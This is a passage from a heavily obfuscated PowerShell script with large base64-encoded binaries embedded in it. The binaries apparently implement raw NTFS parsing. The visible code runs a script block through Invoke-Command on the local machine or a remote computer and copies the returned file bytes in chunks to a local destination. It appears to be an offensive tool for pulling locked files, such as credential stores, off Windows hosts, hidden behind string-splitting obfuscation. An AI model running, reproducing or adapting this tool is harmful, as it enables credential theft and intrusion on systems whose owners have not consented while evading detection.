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FDoz27//1nDi0UIUOjEbv//WcOLRQhQ6Llu//9Zw4tFCFDorm7//1nDi0UIUOijbv//WcOLRQhQ6Jhu//9Zw4tFCFDojW7//1nDi0UIUOiCbv//WcOLRQhQ6Hdu//9Zw4tFCFDobG7//1nDi1QkCI1CDItK7DPI6JNm//+4+FgBEOkghP//zMzMzMzMzItFCFDoP27//1nDi1QkCI1CDItK3DPI6GZm//+4nFkBEOnzg///zMzMzMzMzMzMzItF7FDoD27//1nDi03s6f01//','AAC4/QVY/JENBdHRyX0JpdG1hcEBWQ0F0dHJSZXNpZGVudEBAQEAAAACk/wAQAAAAAC4/QVY/JENBdHRyX0JpdG1hcEBWQ0F0dHJOb25SZXNpZGVudEBAQEAAAAAApP8AEAAAAAAuP0FWPyRDQXR0cl9EYXRhQFZDQXR0clJlc2lkZW50QEBAQACk/wAQAAAAAC4/QVY/JENBdHRyX0RhdGFAVkNBdHRyTm9uUmVzaWRlbnRAQEBAAACk/wAQAAAAAC4/QVY/JENBdHRyX0F0dHJMaXN0QFZDQXR0clJlc2lkZW50QEBAQACk/wAQAAAAAC4/QVY/JENBdHRyX0F0dHJMaXN0QFZDQXR0ck5vblJlc2lkZW50QEBAQAAApP8AEAAAAAAuP0FWPyRDU0xpc3RAVkNGaWxlUmVjb3JkQEBAQAAAAKT/ABAAAAAALj9BVkNBdHRyX0luZGV4QWxsb2NAQAAApP8AEAAAAAAuP0FWQ0F0dHJfSW5kZXhSb290QEAAAACk/wAQAAAAAC4/QVZDSW5kZXhCbG9ja0BAAA','MxwzJDMsMzQzPDNEM0wzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNmQ2bDZ0Nnw2hDaMNpQ2nDakNqw2tDa8NsQ2zDbUNtw25DbsNvQ2/DYENww3FDccNyQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5+DkAOgg6EDoYOiA6KDowOjg6QDpIOlA6WDpgOmg6cDp4OoA6iDqQOpg6oDqoOrA6uDrAOsg60DrYOuA66DrwOvg6ADsIOxA7GDsgOyg7MDs4O0A7SDtQO1g7YDtoO3A7eDuAO4g7kDuYO6A7qDuwO7g7wDvIO9A72DvgO+g78Dv4OwA8CDwQPBg8IDwoPDA8ODxAPEg8UDxYPGA8aDxwPHg8gDyIPJA8mDygPKg8sDy4PMA8yDzQPNg84DzoPPA8+DwAPQg9ED0YPSA9KD0wPTg9QD1IPVA9WD1gPWg9cD14PYA9iD2QPZg9oD2oPbA9uD3APcg90D3YPeA96D3wPfg9AD4IPhA+GD4gPig+MD44PkA+SD5QPlg+YD5oPnA+eD6APog+kD6YPqA+qD6wPrg+wD7IPtA+2D7gPug+8D74PgA/CD8QPxg/ID8oPzA/OD9AP0g/UD9YP2A/aD9wP3g/gD+IP5A/mD+gP6g/sD+4P8A/yD/QP9g/4D/oP/A/+D8AAAAgAQBQAAAAADAIMBAwGDAgMCgwMDA4MEAwSDBQMFgwYDBoMHAweDCAMIgwkDCYMKAwqDCwMLgwwDDIMNAw2DDgMOgw8DD4MAAxCDEQMQAAADABAMwAAABQM1QzWDNcM2AzZDNoM2wzcDN0M3gzfDOAM4QziDOMM5AzlDOYM5wzoDOkM6gzrDOwM7QzuDO8M8AzxDPIM8wz0DPUM9gz3DPgM+Qz6DPsM/Az9DP4M/wzADQENAg0DDQQNBQ0GDQcNCA0JDQoNCw0MDQ0NDg0PDRANEQ0SDRMNFA0VDRYNFw0YDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ0AEABALQCAACEM4gzjDOQM5QzmDOcM6AzpDOoM6wzsDO0M7gzvDPAM8QzyDPMM9Az1DPYM9wz4DPkM+gz7DPwM/Qz+DP8MwA0BDQINAw0EDQUNBg0HDQgNCQ0KDQsNDA0NDQ4NDw0QDRENEg0TDRQNFQ0WDRcNGA0ZDRoNGw0cDR0NHg0fDSANIQ0iDSMNJA0lDSYNJw0oDSkNKg0rDSwNLQ0uDS8NMA0xDTINMw00DTUNNg03DTgNOQ06DTsNPA09DT4NPw0ADUENUQ1SDXENdw17DXwNQQ2CDYYNhw2IDYoNkA2UDZUNmQ2aDZsNnQ2jDacNqA2sDa0Nrg2vDbENtw27DbwNgA3BDcINww3FDcsNzw3QDdQN1Q3XDd0N4Q3iDeYN5w3rDewN7Q3vDfUN+Q36DcAOBA4FDgYOBw4MDg0ODg4UDhUOGw4fDiAOJA4lDiYOKA4uDjIONg43DjgOOQ4+Dj8OAA5BDkMORA5FDkcOSA5JDksOTA5NDk8OUA5RDlMOVA5VDlcOWA5ZDlsOXQ5eDl8OYQ5iDmMOZA5mDmcOaQ5qDmsObQ5uDm8OcQ5yDnMOdA52DncOeA56DnsOfQ5+DkAOgg6EDoYOiA6KDosOjQ6PDpEOlw6YDp4Onw6lDqYOrA6tDrMOtA66DrsOgQ7CDsgOyQ7PDtAO1g7XDt0O3g7kDuUO6w7sDvIO8w75DvoOwA8BDwcPCA8ODw8PFQ8WDxwPHQ8jDyQPKg8rDzEPMg84DzkPPw8AD0YPSg9OD1IPVg9aD14PYg9mD2oPbg9yD3YPeg9+D0IPhg+KD44Pkg+WD5oPng+iD6YPqg+rD68PsA+0D7UPuQ+6D74Pvw+DD8QPyA/JD80Pzg/SD9MP1w/YD9wP3Q/hD+IP5g/nD+sP7A/wD/EP9Q/2D/oP+w//D8AUAEAQAEAAAAwEDAUMCQwKDA4MDwwTDBQMGAwZDB0MHgwiDCMMJwwoDAkMSwxNDE4MUAxVDFcMXAxeDGMMZQxnDGkMagxrDG0Mcgx0DHYMeAx5DHoMfAxBDIgMkAyYDJ8MoAyoDK8MsAy4DIAMyAzQDNgM4AzjDOoM7QzzDPQM+wz8DMQNDA0UDRYNFw0eDSANIQ0nDSgNLw0wDTQNPQ0ADUINTQ1ODVANUg1UDVUNVw1cDWQNaw1sDXQNfA1EDYwNjw2WDZ4Npg2uDbYNuQ27DYwN0Q3VDdkN3A3kDecN7w3yDfoN/Q3FDggOEA4SDhQOFw4fDiEOIw4mDi4OMA4yDjUOPQ4ADkkOSw5NDk8OUQ5TDlUOVw5ZDlsOXg5mDmkOcQ50DnwOfg5BDokOiw6ODpYOmQ6hDqMOpg6uDrAOgBwAQA4AQAAADAcMDgwWDB4MKAw4DAINgw2EDYUNhg2HDYgNiQ2KDYsNjA2NDY4Njw2QDZENkg2TDZQNlQ2WDZcNmA2ZDZoNmw2cDZ0Nng2fDaANoQ2iDaMNpA2lDaYNpw2oDakNqg2rDawNrw2wDbENsg2zDbQNtQ22DbcNuA25DboNuw28Db0Nvg2/DYANwQ3CDcMNxA3FDcYNxw3IDckNyg3LDcwNzQ3ODc8N0A3RDdIN0w3UDdUN1g3XDdgN2Q3aDdsN5Q3pDe0N8Q31Df0NwA4BDgIOAw4NDg4ODw48DkwOzQ7ODs8O0A7RDtIO0w7UDtUO2A7aDtsO3A7dDt4O3w7gDuEO4g7jDuYO5w7oDukO6g7rDuwO7Q7wDvEO8g70DtwPpw+yD7sPhg/SD98P6g/2D8AAACAAQA0AAAACDA8MGQwhDCkMMAw3DD4MBgxNDFUMXAxmDHEMegxBDIgMjgyVDJsMnAydDIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAGcAbAAtAGUAcwAAAGcAdQAtAGkAbgAAAGgAZQAtAGkAbAAAAGgAaQAtAGkAbgAAAGgAcgAtAGIAYQAAAGgAcgAtAGgAcgAAAGgAdQAtAGgAdQAAAGgAeQAtAGEAbQAAAGkAZAAtAGkAZAAAAGkAcwAtAGkAcwAAAGkAdAAtAGMAaAAAAGkAdAAtAGkAdAAAAGoAYQAtAGoAcAAAAGsAYQAtAGcAZQAAAGsAawAtAGsAegAAAGsAbgAtAGkAbgAAAGsAbwBrAC0AaQBuAAAAAABrAG8ALQBrAHIAAABrAHkALQBrAGcAAABsAHQALQBsAHQAAABsAHYALQBsAHYAAABtAGkALQBuAHoAAABtAGsALQBtAGsAAABtAGwALQBpAG4AAABtAG4ALQBtAG4AAABtAHIALQBpAG4AAABtAHMALQBiAG4AAABtAHMALQBtAHkAAABtAHQALQBtAHQAAABuAGIALQBuAG8AAABuAGwALQBiAGUAAABuAGwALQBuAGwAAABuAG4AL','Pz//1mLRQiDwwSDxxBIiUUIdbJW6Bb8//9ZX15bXcNVi+xWi3UIhfYPhIcAAABTV4s9PPAAEFb/14N+eAB0Bf92eP/Xi4aAAAAAhcB0A1D/14N+fAB0Bf92fP/Xi4aIAAAAhcB0A1D/12oGWI1eHIlFCIF7+AR2ARB0DIM7AHQH/','wBuAC0ASQBOAAAAbQBsAC0ASQBOAAAAbQByAC0ASQBOAAAAcwBhAC0ASQBOAAAAbQBuAC0ATQBOAAAAYwB5AC0ARwBCAAAAZwBsAC0ARQBTAAAAawBvAGsALQBJAE4AAAAAAHMAeQByAC0AUwBZAAAAAABkAGkAdgAtAE0AVgAAAAAAcQB1AHoALQBCAE8AAAAAAG4AcwAtAFoAQQAAAG0AaQAtAE4AWgAAAGEAcgAtAEkAUQAAAGQAZQAtAEMASAAAAGUAbgAtAEcAQgAAAGUAcwAtAE0AWAAAAGYAcgAtAEIARQAAAGkAdAAtAEMASAAAAG4AbAAtAEIARQAAAG4AbgAtAE4ATwAAAHAAdAAtAFAAVAAAAHMAcgAtAFMAUAAtAEwAYQB0AG4AAAAAAHMAdgAtAEYASQAAAGEAegAtAEEAWgAtAEMAeQByAGwAAAAAAHMAZQAtAFMARQAAAG0AcwAtAEIATgAAAHUAegAtAFUAWgAtAEMAeQByAGwAAAAAAHEAdQB6AC0ARQBDAAAAAABhAHIALQBFAEcAAAB6AGgALQBIAEsAAABkAGUALQBBAFQAAABlAG4ALQBBAFUAAABlAHMALQBFAFMAAABmAHIALQBDAEEAAABzAHIALQBTAFAALQBDAHkAcgBsAAAAAABzAGUALQBGAEkAAABxAHUAegAtAFAARQAAAAAAYQByAC0ATABZAAAAegBoAC0AUwBHAAAAZABlAC0ATABVAAAAZQBuAC0AQwBBAAAAZQBzAC0ARwBUAAAAZgByAC0AQwBIAAAAaAByAC0AQgBBAAAAcwBtA')
    [UInt64]${o`FFSet} = 0
    

	if (${COmp`UtE`RNAme} -eq ${NU`LL} -or ${CoMpUt`E`RNAme} -imatch "^\s*$")
	{
        if (${pscMd`l`eT}.paRAmETERseTNAme -ieq ("{2}{0}{1}"-f 'ocalDe','st','L'))
        {
            ${ReMotedeSti`Na`TI`ON} = ${l`oc`ALdestiNAt`IOn}   
        }

		&("{3}{4}{2}{0}{1}"-f 'man','d','om','Inv','oke-C') -ScriptBlock ${reMoT`E`sc`Ri`PtbloCk} -ArgumentList @(${peBy`TEs`32}, ${peBY`T`es`64}, ${PA`Th}, ${r`EMOTEd`est`I`NatIon}, ${BufF`eRsI`ze}, ${oFFS`ET})
	}
	else
	{
        if (${P`sCmD`LEt}.pARametERsetnAME -ieq ("{0}{1}{2}"-f'L','oca','lDest'))
        {
            ${R`E`MOt`EDe`stinatiON} = ${nU`LL}
        }

        
        do
        {
		    ${r`esuLT} = &("{0}{2}{3}{1}"-f'Invoke-Co','nd','m','ma') -ScriptBlock ${Rem`OtEscR`I`pT`Block} -ArgumentList @(${p`eB`YTe`s32}, ${p`e`BytES64}, ${Pa`Th}, ${ReM`o`TEDeST`iNatIOn}, ${b`UFFErS`Ize}, ${OfFS`et}) -ComputerName ${CO`M`pUt`ERname}
            if (${RE`suLT} -eq ${Nu`Ll})
            {
                return ${Nu`Ll}
            }
            ${bY`T`ESlEFT} = ${reSu`lt}."b`ytESLE`Ft"

			${f`Ile`S`TreAm} = &("{1}{0}{2}" -f 'bjec','New-O','t') ("{5}{4}{2}{0}{6}{3}{1}" -f'eSt','m','m.IO.Fil','ea','yste','S','r') ${loCa`lDE`stiNa`T`IOn},( (  &("{1}{2}{0}"-f 'LE','GEt','-vArIAB')  ("h"+"2PD")  )."V`AlUe"::"Ap`pe`ND")
			${F`i`LesTr`Eam}.("{0}{1}"-f 'See','k').Invoke(0,  (  &('gi')  vaRIaBlE:s2C9X )."v`ALUE"::"e`ND") | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
			${fi`l`estREAM}.("{1}{0}"-f 'te','Wri').Invoke(${Re`sULt}."b`ytEs", 0, ${r`eSULT}."By`TE`sREAD") | &("{2}{0}{1}" -f 't-N','ull','Ou')
			${fIL`ESt`Ream}.("{0}{1}" -f 'Flus','h').Invoke() | &("{0}{1}{2}" -f'Out-','Nul','l')
			${f`i`lEsT`ReaM}.("{1}{0}" -f 'spose','Di').Invoke() | &("{0}{1}" -f'Out','-Null')
			${fIL`eST`Ream} = ${n`UlL}

            ${oFF`seT} += ${ReSU`lt}."ByTes`RE`AD"

            &("{2}{1}{3}{0}{4}" -f 'o','e','Writ','-Verb','se') ('Cop'+'i'+'ed '+"$Offset "+'by'+'tes. '+"$BytesLeft "+'B'+'yt'+'es '+'rem'+'ainin'+'g')
        } while (${res`ULT}."byTE`s`L`EFT" -gt 0)
	}
}

&("{0}{1}"-f'Ma','in')

 $mDWT::("{1}{0}" -f'llect','Co').Invoke()
  $mDWT::("{0}{1}" -f'C','ollect').Invoke()
}